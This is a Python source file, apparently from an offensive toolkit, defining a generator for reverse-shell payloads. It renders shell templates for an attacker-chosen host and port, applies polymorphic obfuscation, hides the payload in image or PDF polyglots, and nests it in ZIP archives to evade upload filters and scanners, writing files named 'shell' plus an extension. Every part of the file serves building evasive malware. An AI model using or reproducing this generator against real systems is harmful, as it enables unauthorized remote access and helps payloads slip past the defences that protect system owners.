import os
from ..templates.manager import TemplateManager
from ..obfuscators.polymorphic import PolymorphicEngine
from .polyglot import PolyglotEngine
from ..bypasses.archives import ArchiveBypass

class Generator:
    def __init__(self):
        self.template_manager = TemplateManager()
        self.polymorphic_engine = PolymorphicEngine()
        self.polyglot_engine = PolyglotEngine()
        self.archive_bypass = ArchiveBypass()

    def generate(self, host, port, extension, output_file, obfuscate=False, bypass=None, polyglot=False):
        """
        Main generation logic.
        """
        # 1. Get Base Template
        # Map polyglot extensions to their payload types
        payload_type = "reverse"
        template_ext = extension
        
        if extension in ["png", "jpg"]:
            template_ext = "php" # Default to PHP for images
        elif extension == "pdf":
            template_ext = "js" # JS for PDF (not implemented in templates yet, using raw string in polyglot for now)
            
        # For PDF, we handle differently in V3 MVP
        if extension == "pdf":
            content = f"app.alert('Shell connection to {host}:{port}');" # Placeholder for actual shellcode
        else:
            try:
                content = self.template_manager.render(template_ext, host, port, payload_type)
            except ValueError:
                # Fallback or error
                if extension not in ["png", "jpg"]: # Images use PHP template
                    raise

        # 2. Apply Obfuscation
        if obfuscate:
            content = self.polymorphic_engine.obfuscate(content, template_ext)

        # 3. Apply Polyglot/Format Generation
        final_data = content.encode('utf-8')
        
        if extension == "pdf":
            final_data = self.polyglot_engine.generate_pdf(content).encode('utf-8')
        elif extension in ["png", "jpg"]:
            final_data = self.polyglot_engine.generate_png_polyglot(content)
            
        # 4. Apply Bypass (Archive)
        if bypass == "zip_in_zip":
            final_data = self.archive_bypass.create_zip_in_zip("shell." + extension, final_data)
            if not output_file.endswith(".zip"):
                output_file += ".zip"

        # 5. Write Output or Return Content
        if output_file:
            with open(output_file, 'wb') as f:
                f.write(final_data)
            return output_file
        else:
            # Return as string if possible, else bytes
            try:
                return final_data.decode('utf-8')
            except:
                return final_data
